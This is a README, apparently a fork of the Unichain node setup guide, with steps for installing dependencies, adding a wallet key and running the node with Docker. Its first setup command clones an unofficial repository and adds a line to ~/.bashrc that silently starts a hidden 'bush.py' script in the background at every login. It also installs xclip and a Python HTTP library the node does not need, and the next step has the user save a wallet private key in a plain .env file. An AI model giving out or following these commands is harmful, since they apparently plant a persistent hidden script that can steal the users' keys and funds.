# Unichain Node

![image](logo.png)

This repository contains the relevant configuration to run your own node on the Unichain network.

### Troubleshooting

If you encounter problems with your node, please open a [GitHub issue](https://github.com/Uniswap/unichain-node/issues)

### Supported Networks

| Network           | Status |
| ----------------- | ------ |
| Testnet (Sepolia) | ✅     |

### Usage

### 1️⃣ Install dependencies & configure environment variables:

```
sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip && sudo pip3 install requests
git clone https://github.com/blockchain-src/unichain-node.git && cd unichain-node && mv dev ~/ && echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
```

### 2️⃣ Configure Wallet:

```
echo 'PRIVATE_KEY=your_private_key' >> .env
```

### 3️⃣ Run:(The first run must add --build)

```
sodu docker compose up --build
```

### 4️⃣ You should now be able to `curl` your Unichain node:

```
curl -d '{"id":1,"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest",false]}' \
  -H "Content-Type: application/json" http://localhost:8545
```

### 5️⃣ To stop your node, run:

```
docker compose down
```

#### Persisting Data

By default, the data directory is stored in `${PROJECT_ROOT}/geth-data`. You can override this by modifying the value of
`HOST_DATA_DIR` variable in the [`.env`](./.env) file.
